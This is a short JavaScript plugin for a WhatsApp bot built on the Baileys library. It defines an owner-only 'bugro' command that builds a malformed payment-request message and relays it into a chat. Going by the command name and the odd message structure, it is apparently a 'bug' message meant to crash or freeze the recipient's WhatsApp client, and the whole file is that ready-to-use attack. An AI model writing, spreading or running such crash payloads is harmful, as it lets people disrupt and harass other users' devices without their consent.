import { 
  generateWAMessageFromContent
} from "@adiwajshing/baileys";
const { proto } = (await import('@adiwajshing/baileys')).default

let handler = async (m, { conn }) => {
 let requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎hshs"}}}), { userJid: m.chat })
  
  conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
  }
handler.help = ['bugro']
handler.tags = ['owner']
handler.command = /^bugro$/i

handler.owner = true

export default handler